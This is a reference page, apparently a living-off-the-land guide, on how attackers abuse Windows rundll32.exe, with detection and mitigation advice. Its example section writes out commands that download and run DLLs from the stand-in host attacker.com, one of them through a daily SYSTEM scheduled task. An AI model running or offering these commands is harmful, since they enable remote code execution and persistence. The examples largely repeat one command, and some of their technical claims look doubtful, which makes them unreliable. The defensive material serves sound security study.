# rundll32.exe
## What is it?
*```rundll32.exe``` is a legitimate Windows utility that is used to execute functions stored in dynamic link library (DLL) files.*
*It allows users and programs to call exported functions from DLLs without needing to load the entire DLL into memory.*
*Although it's a trusted Windows process, attackers often exploit it for executing malicious code, as it can bypass many security restrictions.*

## Legitimate Usage
- **Executing DLL Functions** → Call functions stored in DLLs that are required for system operations or application functionality.
- **System Configuration & Management** → Used to run certain Windows management scripts or components.
- **Application Initialization** → Many applications use ```rundll32.exe``` to load settings or start processes during startup.
- **Troubleshooting & Repair** → Administrators may use rundll32 to invoke repair functions from system DLLs.

## How to abuse it
- **Bypassing Execution Restrictions** → Attackers can use ```rundll32.exe``` to execute malicious DLLs, bypassing application whitelisting or execution controls.
- **Fileless Malware Execution** → It can be used to execute malicious payloads directly from memory, without writing them to disk.
- **Persistence Mechanism** → Attackers can exploit ```rundll32.exe``` to ensure persistence, as it's often whitelisted by security tools.
- **Privilege Escalation** → Malicious functions in DLLs can be invoked to elevate privileges or perform unauthorized actions on a system.

## Example attacks
### 1. Executing Malicious DLL
*Attackers can use ```rundll32.exe``` to execute a malicious function within a DLL, which could result in malware execution or system compromise.*
**Execute Malicious DLL**

```
rundll32.exe http://attacker.com/malicious.dll,EntryPoint
```

**Effect:**
- Executes a malicious function in a remote DLL, potentially installing malware or compromising the system.

### 2. Fileless Malware Execution
*Since rundll32 can execute code from memory, attackers can bypass file-based security checks.*
**Execute Malicious DLL from Memory**

```
rundll32.exe http://attacker.com/malicious.dll,EntryPoint
```

**Effect:**
- Malicious DLL is executed directly from memory, avoiding detection by file-based security software.

### 3. Persistence via Scheduled Task
*Attackers can use ```rundll32.exe``` in conjunction with a scheduled task to maintain persistence on a system.*
**Schedule Malicious DLL Execution**

```
schtasks /create /tn "MaliciousTask" /tr "rundll32.exe http://attacker.com/persistence.dll,EntryPoint" /sc daily /ru SYSTEM
```

**Effect:**
- Ensures that the malicious DLL is executed daily, allowing attackers to maintain control over the system.

### 4. Bypassing Application Whitelisting (AppLocker)
*Since ```rundll32.exe``` is a trusted system utility, attackers can use it to bypass application whitelisting or software restriction policies.*
**Bypass AppLocker to Execute Payload**

```
rundll32.exe http://attacker.com/payload.dll,EntryPoint
```

**Effect:**
- Executes a malicious payload using a whitelisted utility, bypassing security controls like AppLocker or SRP.

### 5. Remote Code Execution
*Attackers can use ```rundll32.exe``` to execute a DLL hosted on a remote server, allowing remote code execution.*
**Execute Remote Payload**

```
rundll32.exe http://attacker.com/remote_payload.dll,EntryPoint
```

**Effect:**
- Executes code hosted on an external server, enabling remote control over the target system.

# Detection & Mitigation
## Detection Methods
**Monitor rundll32 Executions**
- **Event ID 4688 (Process Creation)** → Detect when ```rundll32.exe``` is executed, especially when used with unusual DLLs or remote locations.
- **Analyze Function Calls** → Watch for suspicious function calls being executed from non-standard DLLs or IP addresses.
- **Fileless Execution Detection** → Detect executions of DLLs directly from memory or network locations.

**Monitor Scheduled Task Creation**
- **Event ID 4698 (Scheduled Task Created)** → Detect when a scheduled task attempts to execute ```rundll32.exe``` with potentially malicious arguments.

**Network Traffic Monitoring**
- **Monitor HTTP/HTTPS Traffic** → Look for unusual HTTP requests to download DLLs or other executable files, which may indicate malicious activity.

## Mitigation Strategies
- **Restrict rundll32 Access** → Use AppLocker or Device Guard to block or limit the use of ```rundll32.exe``` to authorized users and processes.
- **Block Remote Execution** → Use firewalls to prevent communication with untrusted external sources, limiting the ability to download and execute remote DLLs.
- **Disable Unnecessary Services** → Disable or limit the use of services that rely on ```rundll32.exe``` for legitimate operations, if they are not necessary.
- **Use Endpoint Protection Software** → Deploy security software capable of detecting unusual behavior associated with ```rundll32.exe``` and blocking unauthorized executions.
- **Regularly Review Scheduled Tasks** → Regularly audit and review scheduled tasks for any suspicious activity or unexpected execution of rundll32.
